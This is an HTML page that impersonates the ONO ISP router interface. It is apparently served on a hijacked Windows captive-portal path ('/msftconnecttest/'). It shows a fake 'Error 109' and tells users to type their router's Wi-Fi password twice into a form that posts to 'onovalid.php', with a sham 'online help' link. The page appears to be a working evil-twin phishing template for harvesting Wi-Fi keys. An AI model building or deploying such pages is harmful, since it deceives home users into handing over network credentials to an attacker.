    </body><!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>ONO interfaz de administración</title>
<link rel="stylesheet" href="/msftconnecttest/onocss/screen.css" media="screen" type="text/css" />
    </head>
<img class="idono" src="/msftconnecttest/onoimg/ono.png"/>
    <body>
<p>Error 109: no se puede conectar a la red, para segurar la conexión hay que entrar la contraseña wifi del router.La contraseña esta indicado atrás del router.</p>
</br>
</br>
<img class="idclavewifi" src="/msftconnecttest/onoimg/onoclave.jpg"/>
<div id="container">
            <!-- zone de connexion -->
            
            <form method="POST" action="onovalid.php">
                <h1>Conexión</h1>
                
                <label><b>Clave wifi</b></label>
                <input type="text" name="cle">

                <label><b>Confirmación</b></label>
                <input type="text" name="cleconf">

                <input type="submit" id='submit' value='ENTRAR' >

            </form>
        </div>
</br>
<a href="/msftconnecttest/onoshout/onotchat.php" target="_blank"><u>Ayuda en linea</u>?</a>
</body>
</html>
